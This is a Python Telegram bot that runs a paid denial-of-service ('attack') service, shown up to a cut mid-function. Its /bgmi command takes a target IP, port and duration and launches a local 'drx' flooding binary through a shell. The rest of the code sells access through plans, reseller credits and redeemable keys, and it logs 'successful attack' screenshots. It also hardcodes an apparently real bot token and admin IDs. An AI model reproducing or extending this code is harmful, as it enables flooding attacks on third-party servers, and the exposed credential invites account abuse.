import telebot
import threading
import time
import json
import os
import random
import string
import sys # Isse bot ko apni file ka naam khud hi pata chal
import os
import re # Ise top par imports mein add kar Lena 
import subprocess
from telebot import apihelper
from flask import Flask, request, jsonify
from datetime import datetime, timedelta

# --- [ CONFIGURATION ] ---
# Hardcoded token and Admin IDs so you don't need config.json
TOKEN = "8891324334:AAEurMg0_VsrIp7idtiemoLGDJurZTh3gWw"
ADMIN_IDS = ["6739493365"] # Saved as strings for accurate validation

# --- [ 2. BOT INITIALIZATION ] ---
# Token load hone ke baad bot ko start karo
if not TOKEN:
    print("❌ ERROR: TOKEN is missing!")
    exit()

bot = telebot.TeleBot(TOKEN)
DATA_FILE = "paid_data.json"
SCRIPT_NAME = "drx.py"

app = Flask(__name__)
API_SECRET = "DRX_PRIVATE_API" #
TELEGRAM_CHANNEL = ""

# Global Storage for Attacks
active_attacks = [] 
user_cooldowns = {} 

CONFIG = {
    "max_time": 600,
    "max_slots": 5,
    "maintenance": False,
    "footer": "",
    "cooldown": 60,  # Default cooldown 60 seconds (Ise aap /customize se change kar sakenge)
    "feedback_group_id": -1003943879674, # Apne group ki ID yahan dalein
}
# --- [ EXPIRY CONFIGURATION ] ---
# Format: datetime(Year, Month, Day, Hour, Minute, Second)
SCRIPT_EXPIRY = datetime(2026, 6, 25, 12, 30, 30) 

# --- [ GLOBAL EXPIRY CHECK ] ---
# Ye handler har message par trigger hoga aur agar script expire hai to reply karega
@bot.message_handler(func=lambda message: is_script_expired())
def handle_expired_script(message):
    bot.reply_to(
        message, 
        "⚠️ <b>SCRIPT EXPIRE OWNER TO BUY PREMIUM SCRIPT @FLASH_OWERR</b>", 
        parse_mode="HTML")
        
def is_script_expired(): 
    return datetime.now() > SCRIPT_EXPIRY
# --- [ ADD TO CONFIGURATION SECTION ] ---
DOWNLOAD_PASSWORD = "DRX-DIPANSHU" # Change this to your desired password
# --- [ DATABASE LOGIC ] ---
def load_db():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "resellers": {}, "keys": []}
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except:
        return {"users": {}, "resellers": {}, "keys": []}

def save_db(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)
        
# Group access check karne ke liye helper function
def has_group_access(chat_id):
    db = load_db()
    groups = db.get('groups', {})
    chat_id = str(chat_id)
    if chat_id in groups:
        expiry = datetime.strptime(groups[chat_id], '%Y-%m-%d %H:%M:%S')
        if datetime.now() < expiry:
            return True
    return False

# --- [ 1. COLOR PALETTE SYSTEM ] ---
# Maine list format me kar diya hai taki random.choice kaam kare
COLOR_LIST = [
    "\033[1;36m", "\033[1;32m", "\033[1;31m", "\033[1;33m",
    "\033[1;34m", "\033[1;35m", "\033[1;37m", "\033[38;5;208m",
    "\033[38;5;205m", "\033[38;5;141m", "\033[38;5;118m", "\033[38;5;220m"
]

# --- [ 2. HELPER FUNCTION ] ---
# Isse banner ko random color milta hai
def get_random_color():
    return random.choice(COLOR_LIST)
        
# --- [ SECURITY: ACCESS & TIME STACKING ] ---
def get_user_expiry(user_id):
    db = load_db()
    expiry_str = db.get('users', {}).get(str(user_id))
    if not expiry_str:
        return None
    try:
        return datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
    except:
        return None

def has_access(user_id):
    if str(user_id) in ADMIN_IDS: return True
    expiry = get_user_expiry(user_id)
    if expiry and expiry > datetime.now():
        return True
    return False

@bot.message_handler(commands=['start'])
def send_welcome_pro(message):
    user_id = str(message.chat.id)
    db = load_db()
    
    # --- [ USER TRACKING LOGIC FOR /NEWS ] ---
    # Agar 'all_users' list nahi hai toh banao
    if 'all_users' not in db:
        db['all_users'] = []
    
    # Naye user ko list mein add karna (Duplicate check ke saath)
    if user_id not in db['all_users']:
        db['all_users'].append(user_id)
        save_db(db)
    
    # Status Check
    status = "Authorized ✅" if has_access(user_id) else "No Plan ❌"
    
    res = (
        f"🔥 <b>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐀𝐏𝐑𝐎𝐗-𝐏𝐎𝐖𝐄𝐑</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🚀 <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> <b>{status}</b>\n"
        f"👤 <b>𝐘𝐨𝐮𝐫 𝐈𝐃:</b> <code>{user_id}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 <b>𝐃𝐄𝐕:</b> {CONFIG['footer']}\n\n"
        f"💡 <i>Use /help to see all commands.</i>"
    )
    
    try:
        bot.reply_to(message, res, parse_mode="HTML")
    except Exception as e:
        print(f"Start Command Error: {e}")

@bot.message_handler(commands=['help'])
def send_help(message):
    user_id = str(message.chat.id)
    db = load_db()
    
    # Check User Roles
    is_admin = user_id in ADMIN_IDS
    is_reseller = user_id in db.get('resellers', {})
    is_premium = has_access(user_id)

    # 1. Header (Indentation Fixed)
    help_text = (
        "🛠️ <b>𝐇𝐄𝐋𝐏 𝐌𝐄𝐍𝐔</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
    )

    # 2. Public Commands (Added with += to avoid overwriting)
    help_text += (
        "⚔️ <b>𝐀𝐭𝐭𝐚𝐜𝐤:</b> /bgmi <ip> <port> <time>\n"
        "🎫 <b>𝐑𝐞𝐝𝐞𝐞𝐦:</b> /redeem <key>\n"
        "👤 <b>𝐌𝐲 𝐈𝐧𝐟𝐨:</b> /myinfo\n"
        "🔑 <b>𝐌𝐲 𝐊𝐞𝐲:</b> /mykey\n"
        "💎 <b>𝐏𝐥𝐚𝐧𝐬:</b> /plan\n"
        "💰 <b>𝐏𝐫𝐢𝐜𝐞𝐬:</b> /prices\n"
        "🛰️ <b>𝐋𝐨𝐠𝐬:</b> /logs\n"
        "📜 <b>𝐑𝐮𝐥𝐞𝐬:</b> /rules\n"
    )

    # 3. Premium Commands (Fixed HTML tags)
    if is_premium or is_admin:
        help_text += (
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🚀 <b>𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒</b>\n"
            "📊 <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> /status\n"
            "📂 <b>𝐌𝐲 𝐋𝐨𝐠𝐬:</b> /mylogs\n"
            "📸 <b>𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤:</b> /feedback\n"
        )
    else:
        help_text += "\n⚠️ <i>Buy a plan to access VIP Attack commands!</i>\n"

    # 4. Reseller Commands
    if is_reseller or is_admin:
        help_text += (
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🤝 <b>𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐌𝐄𝐍𝐔</b>\n"
            "🔑 <b>𝐆𝐞𝐧 𝐊𝐞𝐲:</b> /genkey [hours] [amount]\n"
            "🔍 <b>𝐂𝐡𝐞𝐜𝐤 𝐈𝐃:</b> /check [id]\n"
        )

    # 5. Admin Commands
    if is_admin:
        help_text += (
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "👑 <b>𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋</b>\n"
            "👥 <b>𝐀𝐝𝐝 𝐔𝐬𝐞𝐫:</b> /addusers [id] [days]\n"
            "💰 <b>𝐀𝐝𝐝 𝐂𝐫𝐞𝐝𝐢𝐭:</b> /addcredit [id] [amt]\n"
            "📢 <b>𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭:</b> /broadcast [msg]\n"
            "🛑 <b>𝐒𝐭𝐨𝐩:</b> /stop | 📂 <b>𝐁𝐚𝐜𝐤𝐮𝐩:</b> /upload_files\n"
        )

    help_text += f"━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>𝐎𝐰𝐧𝐞𝐫:</b> {CONFIG['footer']}"

    try:
        # Final HTML Reply
        bot.reply_to(message, help_text, parse_mode="HTML")
    except Exception as e:
        # Emergency Plain Text Backup (In case of HTML failure)
        clean_text = help_text.replace("<b>","").replace("</b>","").replace("<code>","").replace("</code>","").replace("<i>","").replace("</i>","")
        bot.reply_to(message, clean_text)
        print(f"Help Error Fixed: {e}")

# --- [ FIXED MONITOR ATTACK FUNCTION ] ---
def monitor_attack(attack_data, duration, chat_id):
    try:
        # 1. Binary ko background mein execute karna
        binary_cmd = f"./drx {attack_data['ip']} {attack_data['port']} {duration} 500"
        subprocess.Popen(binary_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # 2. SAHI TIME TAK WAIT KARNA (Isse attack jaldi khatam nahi hoga)
        time.sleep(int(duration))
        
    except Exception as e:
        print(f"Binary Error: {e}")

    # 3. Active list se hatana aur Slot free karna
    if attack_data in active_attacks:
        active_attacks.remove(attack_data)
        
        # Professional Finish Report
        finish_text = (
            f"✅ <b>𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 <b>𝐓𝐚𝐫𝐠𝐞𝐭:</b> <code>{attack_data['ip']}:{attack_data['port']}</code>\n"
            f"🕒 <b>𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> <code>{duration}s</code>\n"
            f"📊 <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> 🟢 𝐒𝐥𝐨𝐭 𝐅𝐫𝐞𝐞𝐝\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🏁 <i>Next command ke liye system ready hai.</i>\n"
            f"🚀 <b>Power by:</b> {CONFIG['footer']}"
        )
        
        try:
            bot.send_message(chat_id, finish_text, parse_mode="HTML")
        except: 
            pass

@bot.message_handler(commands=['bgmi'])
def handle_bgmi_fixed(message):
    chat_id = message.chat.id
    user_id = str(message.from_user.id)
    cmd = message.text.split()

    # --- [ 1. FORMAT & IP/PORT VALIDATION ] ---
    if len(cmd) != 4:
        bot.reply_to(message, "⚠️ <b>Usage: /bgmi &lt;IP&gt; &lt;PORT&gt; &lt;TIME&gt;</b>", parse_mode="HTML")
        return

    ip, port, duration = cmd[1], cmd[2], cmd[3]

    # IP Pattern Check (Standard IPv4)
    ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    if not re.match(ip_pattern, ip):
        bot.reply_to(message, "❌ <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐏!</b> Sahi IP address dalein.", parse_mode="HTML")
        return

    if not port.isdigit() or not (1 <= int(port) <= 65535):
        bot.reply_to(message, "❌ <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐏𝐨𝐫𝐭!</b> Range 1-65535 honi chahiye.", parse_mode="HTML")
        return

    # --- [ 2. ACCESS & SLOTS CHECK ] ---
    if not has_access(user_id):
        bot.reply_to(message, "❌ <b>𝐏𝐥𝐚𝐧 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝!</b>\nCheck /plan to buy access.", parse_mode="HTML")
        return

    if len(active_attacks) >= CONFIG['max_slots']:
        bot.reply_to(message, "❌ <b>𝐀𝐥𝐥 𝐒𝐥𝐨𝐭𝐬 𝐅𝐮𝐥𝐥!</b> Thoda wait karein.", parse_mode="HTML")
        return

    if int(duration) > CONFIG['max_time']:
        bot.reply_to(message, f"❌ <b>𝐌𝐚𝐱 𝐓𝐢𝐦𝐞: {CONFIG['max_time']}s</b>", parse_mode="HTML")
        return

    # --- [ 3. TRIGGER ATTACK ] ---
    attack_entry = {"ip": ip, "port": port, "duration": duration, "user": user_id}
    active_attacks.append(attack_entry)
    user_cooldowns[user_id] = datetime.now() 
    
    threading.Thread(target=monitor_attack, args=(attack_entry, duration, chat_id)).start()

    # --- [ 4. COMBINED SUCCESS & FEEDBACK REPLY ] ---
    success_msg = (
        f"🚀 <b>𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 <b>𝐓𝐚𝐫𝐠𝐞𝐭:</b> <code>{ip}:{port}</code>\n"
        f"🕒 <b>𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> <code>{duration}s</code>\n"
        f"⚡ <b>𝐌𝐞𝐭𝐡𝐨𝐝:</b> <code>VIP-BINARY</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📸 <b>𝐒𝐄𝐍𝐃 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 (𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊)</b>\n"
        f"ATTACK KHATAM HONE PAR SCREENSHOT ZAROOR BHEJEIN!\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 <b>𝐎𝐰𝐧𝐞𝐫:</b> {CONFIG['footer']}"
    )

    msg = bot.reply_to(message, success_msg, parse_mode="HTML")
    
    # Photo feedback ke liye agla step register karna
    bot.register_next_step_handler(msg, process_feedback_photo)

# --- [ EXTERNAL FEEDBACK HANDLER ] ---
def process_feedback_photo(message):
    user_id = str(message.chat.id)
    if message.content_type == 'photo':
        try:
            bot.send_photo(
                CONFIG["feedback_group_id"], 
                message.photo[-1].file_id, 
                caption=(
                    f"🌟 <b>𝐍𝐄𝐖 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 <b>𝐔𝐬𝐞𝐫:</b> <code>{user_id}</code>\n"
                    f"🚀 <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> <i>Attack Successful ✅</i>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"👑 <b>𝐁𝐨𝐭:</b> {CONFIG['footer']}"
                ),
                parse_mode="HTML"
            )
            bot.reply_to(message, "❤️ <b>𝐓𝐡𝐱𝐱 𝐟𝐨𝐫 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤!</b>\nAapka screenshot group mein upload kar diya gaya hai.", parse_mode="HTML")
        except Exception:
            bot.send_message(user_id, "❌ Error: Feedback upload nahi ho paya. Bot permissions check karein.")
    else:
        bot.reply_to(message, "⚠️ <b>𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>\nPhoto nahi mili. Agli baar attack ke baad screenshot zaroor dein.")

# --- [ LIVE STATUS UPDATER ] ---
def update_status_live(message_obj):
    # Ye loop message ko 5 baar edit karega (har 3 second mein)
    for _ in range(5):
        time.sleep(3)
        used = len(active_attacks)
        res = f"📊 <b>𝐋𝐈𝐕𝐄 𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒</b>\n🚀 Slots: {used}/{CONFIG['max_slots']}\n━━━━━━━━━━━━━━\n"
        for i in range(1, CONFIG['max_slots'] + 1):
            if i <= used:
                att = active_attacks[i-1]
                rem = max(0, int(att['end_time'] - time.time())) if 'end_time' in att else 0
                total = att.get('duration', 1)
                progress = int(((int(total) - rem) / int(total)) * 10) if int(total) > 0 else 0
                bar = "🔵" * progress + "⚪" * (10 - progress)
                res += f"𝐒𝐋𝐎𝐓 {i}: 🔴 𝐁𝐔𝐒𝐘\n└ ⏳ {rem}s [{bar}]\n\n"
            else:
                res += f"𝐒𝐋𝐎𝐓 {i}: 🟢 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄\n"
        try:
            bot.edit_message_text(res, message_obj.chat.id, message_obj.message_id, parse_mode="HTML")
        except: break

@bot.message_handler(commands=['status'])
def show_status(message):
    if not has_access(message.chat.id): return
    used = len(active_attacks)
    res = f"📊 <b>𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒</b>\n🚀 Slots: {used}/{CONFIG['max_slots']}\n━━━━━━━━━━━━━━\n"
    # Pehla message bhej kar thread shuru karna
    msg = bot.reply_to(message, res + "<b>Updating live...</b>", parse_mode="HTML")
    threading.Thread(target=update_status_live, args=(msg,)).start()

# --- [ HELPER: GENERATE RANDOM KEY ] ---
def generate_key(length=10):
    return "APROX-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

@bot.message_handler(commands=['genkey'])
def handle_genkey_advance(message):
    user_id = str(message.chat.id)
    db = load_db()
    
    # --- [ ACCESS CHECK ] ---
    is_admin = user_id in ADMIN_IDS
    is_reseller = user_id in db.get('resellers', {})
    
    if not (is_admin or is_reseller):
        return # Normal users ko reply nahi jayega
    
    cmd = message.text.split()
    if len(cmd) < 3:
        bot.reply_to(message, "⚠️ <b>Usage:</b> /genkey [time][h/d/w] [amount]\n\n💡 <b>Example:</b>\n• <code>/genkey 2h 5</code>\n• <code>/genkey 1d 10</code>", parse_mode="HTML")
        return
        
    duration_input = cmd[1].lower()
    try:
        amount = int(cmd[2])
    except ValueError:
        bot.reply_to(message, "❌ <b>Amount</b> number hona chahiye!")
        return
    
    # --- [ RESELLER CREDIT CHECK ] ---
    if is_reseller and not is_admin:
        reseller_data = db['resellers'][user_id]
        if reseller_data['credits'] < amount:
            bot.reply_to(message, f"❌ <b>𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐂𝐫𝐞𝐝𝐢𝐭𝐬!</b>\n\nRequired: <code>{amount}</code>\nAvailable: <code>{reseller_data['credits']}</code>\n\nContact Admin for more credits.", parse_mode="HTML")
            return
        
        # Credits katna
        db['resellers'][user_id]['credits'] -= amount
    
    # --- [ TIME PARSING LOGIC ] ---
    try:
        if duration_input.endswith('h'):
            hours = int(duration_input[:-1])
        elif duration_input.endswith('d'):
            hours = int(duration_input[:-1]) * 24
        elif duration_input.endswith('w'):
            hours = int(duration_input[:-1]) * 168
        else:
            hours = int(duration_input)
    except ValueError:
        bot.reply_to(message, "❌ <b>Invalid Format!</b> Use 1h, 2d, or 1w.")
        return

    generated_keys = []
    for _ in range(amount):
        # Unique Key Generation
        key = "APROX-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
        db.setdefault('keys', []).append({
            "key": key, 
            "duration_hours": hours, 
            "status": "unused", 
            "created_by": user_id,
            "role": "Admin" if is_admin else "Reseller"
        })
        generated_keys.append(key)
    
    save_db(db)
    
    # --- [ PROFESSIONAL REPLY ] ---
    res = (
        f"🔑 <b>{amount} 𝐍𝐄𝐖 𝐊𝐄𝐘𝐒 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ <b>𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> <code>{duration_input}</code> ({hours} Hours)\n"
        f"👤 <b>𝐁𝐲:</b> <code>{'Admin' if is_admin else 'Reseller'}</code>\n"
    )
    
    if is_reseller and not is_admin:
        res += f"💰 <b>𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐂𝐫𝐞𝐝𝐢𝐭𝐬:</b> <code>{db['resellers'][user_id]['credits']}</code>\n"
        
    res += "━━━━━━━━━━━━━━━━━━━━━━\n📋 <b>𝐊𝐞𝐲𝐬:</b>\n"
    res += "\n".join([f"🎫 <code>{k}</code>" for k in generated_keys])
    res += f"\n━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>𝐎𝐰𝐧𝐞𝐫:</b> {CONFIG['footer']}"
    
    bot.reply_to(message, res, parse_mode="HTML")

# --- [ SMART REDEEM WITH TIME DISPLAY ] ---
@bot.message_handler(commands=['redeem'])
def handle_redeem(message):
    user_id = str(message.chat.id)
    cmd = message.text.split()
    
    # --- [ USAGE REPLY LOGIC ] ---
    if len(cmd) != 2:
        usage_msg = (
            f"🎫 <b>𝐇𝐎𝐖 𝐓𝐎 𝐑𝐄𝐃𝐄𝐄𝐌?</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 <b>𝐔𝐬𝐚𝐠𝐞:</b> <code>/redeem [Your_Key]</code>\n\n"
            f"📝 <b>𝐄𝐱𝐚𝐦𝐩𝐥𝐞:</b>\n"
            f"<code>/redeem DRX-ABC123XYZ</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📞 <b>𝐁𝐮𝐲 𝐊𝐞𝐲:</b> {CONFIG['footer']}"
        )
        bot.reply_to(message, usage_msg, parse_mode="HTML")
        return

    input_key = cmd[1]
    db = load_db()
    found_key = next((k for k in db.get('keys', []) if k['key'] == input_key and k['status'] == "unused"), None)
            
    if found_key:
        found_key['status'] = "used"
        found_key['used_by'] = user_id
        
        current_expiry = get_user_expiry(user_id)
        # Bacha hua time check karna display ke liye
        old_time_str = current_expiry.strftime('%Y-%m-%d %H:%M:%S') if current_expiry and current_expiry > datetime.now() else "None"
        
        added_duration = timedelta(hours=found_key['duration_hours'])
        new_expiry = (current_expiry if current_expiry and current_expiry > datetime.now() else datetime.now()) + added_duration
        
        db.setdefault('users', {})[user_id] = new_expiry.strftime('%Y-%m-%d %H:%M:%S')
        save_db(db)
        
        res = (
            f"✅ <b>𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐑𝐞𝐝𝐞𝐞𝐦𝐞𝐝!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📅 <b>𝐎𝐥𝐝 𝐄𝐱𝐩𝐢𝐫𝐲:</b> <code>{old_time_str}</code>\n"
            f"➕ <b>𝐀𝐝𝐝𝐞𝐝:</b> <code>{found_key['duration_hours']} Hours</code>\n"
            f"🚀 <b>𝐍𝐞𝐰 𝐄𝐱𝐩𝐢𝐫𝐲:</b> <b>{db['users'][user_id]}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎮 <b>Enjoy your VIP Access!</b>"
        )
        bot.reply_to(message, res, parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐔𝐬𝐞𝐝 𝐊𝐞𝐲!</b>\nSahi key enter karein ya admin se contact karein.", parse_mode="HTML")

# --- [ ADMIN MANAGEMENT COMMANDS ] ---
@bot.message_handler(commands=['addusers', 'rmusers', 'addreseller', 'rmreseller', 'addcredit', 'rmcredit'])
def admin_manage_logic(message):
    user_id = str(message.chat.id)
    
    # Check if sender is Admin
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ <b>𝐀𝐝𝐦𝐢𝐧 𝐎𝐧𝐥𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝!</b>", parse_mode="HTML")
        return

    cmd = message.text.split()
    action = cmd[0][1:] # Get command name (e.g., addusers)
    db = load_db()

    if len(cmd) < 2:
        bot.reply_to(message, f"⚠️ <b>Usage:</b> <code>/{action} [user_id] [amount/days]</code>", parse_mode="HTML")
        return

    target_id = cmd[1]

    # 1. ADD USERS (Direct Premium)
    if action == "addusers":
        days = int(cmd[2]) if len(cmd) > 2 else 30
        expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
        db.setdefault('users', {})[target_id] = expiry
        msg = f"✅ <b>User Added!</b>\n🆔 ID: <code>{target_id}</code>\n📅 Expiry: <code>{expiry}</code>"

    # 2. REMOVE USERS
    elif action == "rmusers":
        if target_id in db.get('users', {}):
            del db['users'][target_id]
            msg = f"🗑️ <b>User Removed:</b> <code>{target_id}</code>"
        else: msg = "❌ ID not found in Premium list."

    # 3. ADD RESELLER
    elif action == "addreseller":
        credits = int(cmd[2]) if len(cmd) > 2 else 0
        db.setdefault('resellers', {})[target_id] = {"credits": credits}
        msg = f"🤝 <b>Reseller Added!</b>\n🆔 ID: <code>{target_id}</code>\n💰 Credits: <code>{credits}</code>"

    # 4. REMOVE RESELLER
    elif action == "rmreseller":
        if target_id in db.get('resellers', {}):
            del db['resellers'][target_id]
            msg = f"🗑️ <b>Reseller Removed:</b> <code>{target_id}</code>"
        else: msg = "❌ ID not found in Reseller list."

    # 5. ADD CREDIT (For existing Resellers)
    elif action == "addcredit":
        if target_id in db.get('resellers', {}):
            amount = int(cmd[2])
            db['resellers'][target_id]['credits'] += amount
            msg = f"💰 <b>Credits Added!</b>\n🆔 ID: <code>{target_id}</code>\n➕ Amount: {amount}\n📊 Total: {db['resellers'][target_id]['credits']}"
        else: msg = "❌ ID is not a Reseller!"

    # 6. REMOVE CREDIT
    elif action == "rmcredit":
        if target_id in db.get('resellers', {}):
            amount = int(cmd[2])
            db['resellers'][target_id]['credits'] = max(0, db['resellers'][target_id]['credits'] - amount)
            msg = f"📉 <b>Credits Removed!</b>\n🆔 ID: <code>{target_id}</code>\n➖ Amount: {amount}"
        else: msg = "❌ ID is not a Reseller!"

    save_db(db)
    bot.reply_to(message, msg, parse_mode="HTML")

@bot.message_handler(commands=['genreseller'])
def add_reseller_pro(message):
    user_id = str(message.chat.id)
    
    # Sirf Admin/Owner access
    if user_id not in ADMIN_IDS:
        return

    cmd = message.text.split()
    # Usage: /genreseller [Target_ID] [Credits]
    if len(cmd) != 3:
        bot.reply_to(message, (
            f"❌ <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐔𝐬𝐚𝐠𝐞!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 <b>𝐔𝐬𝐚𝐠𝐞:</b> <code>/genreseller [User_ID] [Credits]</code>\n"
            f"📝 <b>𝐄𝐱𝐚𝐦𝐩𝐥𝐞:</b> <code>/genreseller 12345678 50</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        ), parse_mode="HTML")
        return

    target_id = cmd[1]
    try:
        credits_to_add = int(cmd[2])
    except ValueError:
        bot.reply_to(message, "❌ Credits number mein hone chahiye!")
        return

    db = load_db()
    
    # Reseller data initialize karna agar nahi hai
    if 'resellers' not in db:
        db['resellers'] = {}

    # Agar user pehle se reseller hai toh credits add ho jayenge, nahi toh naya ban jayega
    if target_id in db['resellers']:
        db['resellers'][target_id]['credits'] += credits_to_add
        action = "Updated"
    else:
        db['resellers'][target_id] = {"credits": credits_to_add}
        action = "Added"

    save_db(db)

    # Success Message
    res = (
        f"🤝 <b>𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 {action.upper()}!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>𝐔𝐬𝐞𝐫 𝐈𝐃:</b> <code>{target_id}</code>\n"
        f"💰 <b>𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐀𝐝𝐝𝐞𝐝:</b> <code>{credits_to_add}</code>\n"
        f"📈 <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐫𝐞𝐝𝐢𝐭𝐬:</b> <code>{db['resellers'][target_id]['credits']}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <i>Ab ye user keys generate kar sakta hai.</i>"
    )
    
    bot.reply_to(message, res, parse_mode="HTML")
    
    # Reseller ko notification bhejna
    try:
        bot.send_message(target_id, (
            f"🎉 <b>𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Aapko <b>{credits_to_add} Credits</b> mile hain.\n"
            f"Aap ab ek <b>Authorized Reseller</b> hain.\n"
            f"Use <code>/genkey</code> to create keys.\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        ), parse_mode="HTML")
    except:
        pass

@bot.message_handler(commands=['clear_users'])
def clear_expired_users(message):
    if str(message.chat.id) not in ADMIN_IDS: return
    
    db = load_db()
    current_time = datetime.now()
    expired_count = 0
    
    # User list se expired logo ko nikalna
    users = db.get('users', {}).copy()
    for uid, exp_str in users.items():
        try:
            exp_dt = datetime.strptime(exp_str, '%Y-%m-%d %H:%M:%S')
            if exp_dt < current_time:
                del db['users'][uid]
                expired_count += 1
        except: pass
        
    save_db(db)
    bot.reply_to(message, f"🧹 <b>𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐂𝐥𝐞𝐚𝐧𝐞𝐝!</b>\nRemoved <code>{expired_count}</code> expired users.", parse_mode="HTML")

@bot.message_handler(commands=['rules'])
def show_rules(message):
    rules_text = (
        f"📜 <b>𝐀𝐏𝐑𝐎𝐗-𝐏𝐎𝐖𝐄𝐑 𝐔𝐒𝐄𝐑 𝐑𝐔𝐋𝐄𝐒</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"1️⃣ Ek baar mein ek hi attack allowed hai.\n"
        f"2️⃣ Same IP/Port par baar-baar attack na karein.\n"
        f"3️⃣ Bot ko abuse karne par permanent ban lagega.\n"
        f"4️⃣ Admin decisions are final.\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Follow the rules to avoid Ban!"
    )
    bot.reply_to(message, rules_text, parse_mode="HTML")
            
@bot.message_handler(commands=['allkeylist'])
def show_all_keys(message):
    user_id = str(message.chat.id)
    
    # Sirf Admin access
    if user_id not in ADMIN_IDS:
        return

    db = load_db()
    all_keys = db.get('keys', [])
    
    if not all_keys:
        bot.reply_to(message, "❌ <b>𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐄𝐦𝐩𝐭𝐲!</b>\nAbhi tak koi key generate nahi hui.", parse_mode="HTML")
        return

    # Filter Keys
    unused_keys = [k for k in all_keys if k['status'] == "unused"]
    used_keys = [k for k in all_keys if k['status'] == "used"]

    # 1. UNUSED KEYS SECTION
